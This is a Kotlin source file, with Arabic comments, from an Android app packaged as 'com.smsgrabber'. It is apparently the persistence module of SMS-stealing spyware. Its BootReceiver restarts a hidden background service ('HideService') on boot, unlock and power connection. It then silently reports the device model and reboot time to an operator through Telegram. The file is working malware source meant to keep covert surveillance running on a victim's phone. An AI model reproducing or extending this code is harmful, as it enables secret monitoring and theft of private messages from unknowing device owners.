package com.smsgrabber

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

/**
 * يعيد تشغيل الخدمة بعد إعادة تشغيل الجهاز
 * يدعم عدة أنواع من أحداث التشغيل لمختلف الأجهزة
 */
class BootReceiver : BroadcastReceiver() {

    companion object {
        private val BOOT_ACTIONS = setOf(
            Intent.ACTION_BOOT_COMPLETED,
            "android.intent.action.QUICKBOOT_POWERON",
            "com.htc.intent.action.QUICKBOOT_POWERON",
            Intent.ACTION_LOCKED_BOOT_COMPLETED,
            Intent.ACTION_USER_PRESENT,
            Intent.ACTION_POWER_CONNECTED
        )
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return

        if (action !in BOOT_ACTIONS) return

        // إعادة تشغيل الخدمة الخلفية
        val serviceIntent = Intent(context, HideService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        } catch (e: Exception) {
            // محاولة بديلة
            try {
                context.startService(serviceIntent)
            } catch (_: Exception) {}
        }

        // إرسال إشعار للتيليجرام
        if (action == Intent.ACTION_BOOT_COMPLETED ||
            action == Intent.ACTION_LOCKED_BOOT_COMPLETED) {
            notifyTelegram()
        }
    }

    private fun notifyTelegram() {
        Thread {
            try {
                // انتظار حتى يتصل الجهاز بالشبكة
                Thread.sleep(5000)

                val message = buildString {
                    appendLine("🔄 *تنبيه: تم إعادة تشغيل الجهاز*")
                    appendLine("📱 الموديل: ${Build.MODEL}")
                    appendLine("🕐 الوقت: ${System.currentTimeMillis()}")
                    appendLine("✅ الخدمة استؤنفت بنجاح")
                }
                TelegramApi.sendMessage(message)
            } catch (_: Exception) {}
        }.start()
    }
}
